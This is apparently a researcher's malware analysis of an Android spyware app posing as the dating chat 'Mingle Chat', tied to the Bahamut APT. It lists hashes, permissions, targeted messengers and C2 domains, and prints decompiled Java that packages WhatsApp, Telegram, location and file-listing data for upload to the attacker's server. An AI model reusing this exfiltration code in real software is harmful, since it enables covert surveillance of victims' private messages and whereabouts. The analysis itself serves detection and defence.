## Bahamut 

### Overview 
Sample seems to be distributed through a dating social media, chat app called mingle chat. In the config files (`BASE_URL`) set to https://gkcx6ye4t4zafw8ju2xdr5na5.de:2053. Randomness in domain is a malicious behavior. Installing the app prompts the user to enable a few permissions and Accessibility Service to fetch data from the targeted messaging applications. 

### Static Analysis

**App Name**: Mingle Chat
**Package Name**: com.hydrogen.mingle
**MD5**: f4bfbcce73cd11051fc259a7811d2245
**SHA1**: fb63cfb371dbb79fde2f2b2835bb0edba4b5e5a6
**SHA256**: 5cd30ccebdd87fb1ea8f3a8995fc81b5b78e17ccc0f145703b5bd4da1ec22e66
**SHA512**: ea1ba8c286576afda8af7fd714723ddd6c16546be34ef8a6409b95f743abc7acca5bc6abf468f97cacdc10f02b81c2d44527c2aa85c942e46da78c367acca8fd
**ssdeep**: 196608:KfnBLVOOAWjcCVMMEzaI4yqr7opBiwIwOfCV4AGBWiLMFoCpQD0eCLfbgjuSeu4/:anjOjW40I4H7opJIwOtfWiLMFvO0enjw

----


```java
public final class BuildConfig {
    public static final String APPLICATION_ID = "com.hydrogen.mingle";
    public static final String BASE_URL = "https://gkcx6ye4t4zafw8ju2xdr5na5.de:2053";
    public static final String BASE_URL_CHAT = "https://gkcx6ye4t4zafw8ju2xdr5na5.de:8443";
    public static final String BUILD_TYPE = "debug";
    public static final boolean DEBUG = false;
    public static final int VERSION_CODE = 1;
    public static final String VERSION_NAME = "1.1.5";
``` 

AndroidManifest file shows the app is asking for the following permissions that is another red flag: 

```xml
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>

``` 

Permissions like, `READ_CALL_LOG`, `READ_SMS`, `READ_PRIVILEGED_PHONE_STATE`, and `DOWNLOAD_WITHOUT_NOTIFICATION` among some others are dangerous and seems that app is trying to capture/log SMS, Call, Contacts, etc. Also, registering an intent with permission for `BIND_ACCESSIBILITY_SERVIC` shows the attempt for logging window contents by abusing the `android.accessibilityservice`. The main logic behind that is defined under `"com.example.monitoring.system.services.MasterAccessibilityService"`. Looking through the directory structure,`resources/com/example/monitoring/database/models/dao`, we can find listeners set for capturing/collecting the text messages in popular social media networking apps such as Facebook, Imo, Signal, Viber, WhatsApp, Telegram, etc. 


Grepping for `AccessibilityEvent` listener, we get the following results: 

```
$ grep -ir 'onAccessibilityEvent' .

public MasterAccessibilityService$onAccessibilityEvent$4(ViberDao viberDao, ViberMessages viberMessages, Continuation<? super MasterAccessibilityService$onAccessibilityEvent$4> continuation) {
        super(2, continuation);
        this.$viberDao = viberDao;
        this.$viberMessage = viberMessages;
    }

public MasterAccessibilityService$onAccessibilityEvent$1(WhatsAppDao whatsAppDao, WhatsAppMessages whatsAppMessages, Continuation<? super MasterAccessibilityService$onAccessibilityEvent$1> continuation) {
        super(2, continuation);
        this.$whatsappMessageDao = whatsAppDao;
        this.$whatsappMessage = whatsAppMessages;
    }
``` 

Here is the list of listeners for our 

```
com.whatsapp
org.thoughtcrime.securesms
org.telegram.messenger
com.imo.android.imoim
com.facebook.orca
com.viber.voip
com.secapp.tor.conion
com.protectedtext.android
com.android.settings
``` 

Here using a websocket connection, app sends the collected data to the CnC server as a JSON object which includes `imei`, `message`, `simSerial`, and etc. The following code is located at `sources/com/example/monitoring/network/api/okhttp/Commander$prepareJson$2.java`. 

```java
jSONObject = this.$jsonObject.put("whatsappData", jSONArray);
                } else if (StringsKt.equals(this.$dataFor, "telegram", true)) {
                    Intrinsics.checkNotNull(accessMainDatabase);
                    List<TelegramMessages> isNonServed6 = accessMainDatabase.telegramDao().isNonServed(0);
                    if (!isNonServed6.isEmpty()) {
                        for (TelegramMessages telegramMessages : isNonServed6) {
                            JSONObject jSONObject12 = new JSONObject();
                            jSONObject12.put("imei", Helpers.Companion.getIMEIDeviceId(this.$context));
                            jSONObject12.put("uid", telegramMessages.getTelegramId() + ':' + this.$uniqueInstallationID);
                            jSONObject12.put("title", telegramMessages.getTelegramTitle());
                            jSONObject12.put("message", telegramMessages.getTelegramMessage());
                            jSONObject12.put("type", telegramMessages.getType());
                            jSONObject12.put("recordDate", telegramMessages.getMessageTime());
                            jSONObject12.put("triggerName", this.$triggerName);
                            this.$arrayToReturn.put(jSONObject12);
                        }
``` 

Also, app grabs the contact and liveInfos which includes the geo-location data to the server: 

```java
if (StringsKt.equals(this.$dataFor, "liveInfos", true)) {
                    Intrinsics.checkNotNull(accessMainDatabase);
                    List<UserLocation> isNonServed = accessMainDatabase.userLocationDao().isNonServed(0);
                    if (!isNonServed.isEmpty()) {
                        for (UserLocation userLocation : isNonServed) {
                            JSONObject jSONObject3 = new JSONObject();
                            JSONObject jSONObject4 = new JSONObject();
                            jSONObject3.put("imei", Helpers.Companion.getIMEIDeviceId(this.$context));
                            jSONObject3.put("uid", userLocation.getId() + ':' + this.$uniqueInstallationID);
                            jSONObject3.put("networkState", Helpers.Companion.checkNetwork(this.$context));
                            jSONObject4.put("lat", userLocation.getLatitude());
                            jSONObject4.put("long", userLocation.getLongitude());
                            jSONObject4.put("address", userLocation.getAddress());
                            jSONObject3.put("location", jSONObject4);
                            jSONObject3.put("recordDate", userLocation.getLocation_date());
                            jSONObject3.put("triggerName", this.$triggerName);
                            this.$arrayToReturn.put(jSONObject3);
                        }
                    }
                    jSONObject = this.$jsonObject.put("liveInfos", jSONArray);
                }
``` 

On top of that, app sends an extensive list of all files/directories on the system to the CnC using the following routines: 

```java
//bahamut/com.hydrogen.mingle/sources/com/example/monitoring/utils/Helpers.java
public final String sendWholeFiles() {
            return new Gson().toJson(getListFiles(new File(Environment.getExternalStorageDirectory().getPath())), Directory.class);
}

// bahamut/com.hydrogen.mingle/sources/com/example/monitoring/network/api/okhttp/Commander$prepareJson$2.java
else if (StringsKt.equals(this.$dataFor, "fileListing", true)) {
                String sendWholeFiles = Helpers.Companion.sendWholeFiles();
                Intrinsics.checkNotNull(sendWholeFiles);
                JSONObject jSONObject2 = new JSONObject(sendWholeFiles);
                this.$jsonObject.put("imei", Helpers.Companion.getIMEIDeviceId(this.$context));
                this.$jsonObject.put("triggerName", this.$triggerName);
                jSONObject = this.$jsonObject.put("fileListing", jSONObject2);
            }
```

The prepared JSON object stream is prepared in the Commander class located at `sources/com/example/monitoring/network/api/okhttp/Commander.java` and sent to the server over an HTTP request. 

```java
public final Object sendWithHttp(Context context, String str, String str2, Continuation<? super Unit> continuation) {
        Timber.Forest.tag(this.tag).d(this.authToken, new Object[0]);
        Object withContext = BuildersKt.withContext(Dispatchers.getIO(), new Commander$sendWithHttp$2(context, str, str2, this, null), continuation);
        return withContext == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? withContext : Unit.INSTANCE;
    }
``` 



### Dynamic Analysis 


```
$ whois gkcx6ye4t4zafw8ju2xdr5na5.de

contact:      administrative
name:         Vorstand DENIC eG
organisation: DENIC eG
address:      Theodor-Stern-Kai 1
address:      Frankfurt am Main 60596
address:      Germany
phone:        +49 69 27235 0
fax-no:       +49 69 27235 235
e-mail:       ianacontact@denic.de

contact:      technical
name:         Business Services
organisation: DENIC eG
address:      Theodor-Stern-Kai 1
address:      Frankfurt am Main 60596
address:      Germany
phone:        +49 69 27235 272
fax-no:       +49 69 27235 234
e-mail:       dbs@denic.de
``` 

Server is down but by running the sample in AVD, I found the following callbacks to CnC which can be used at IOCs for writing detection rules (Yara or OpenIOC/XML). 

```
https://gkcx6ye4t4zafw8ju2xdr5na5.de
http://193.23.161.164:3000
https://gkcx6ye4t4zafw8ju2xdr5na5.de:2053
https://gkcx6ye4t4zafw8ju2xdr5na5.de:8443
https://gkcx6ye4t4zafw8ju2xdr5na5.de:8443/files/
https://gkcx6ye4t4zafw8ju2xdr5na5.de:8443/apk/ChatService_master.apk
https://gkcx6ye4t4zafw8ju2xdr5na5.de:2053/api/v0.0.1/content/getContent

``` 


By looking at public IOC DBs, app is part of Bahamut Advanced Persistent Threat (APT) group. Here is the relationship between this sample/domain and other samples: 

![Bahamut APT](./pics/Bahamut-APT-white.png)







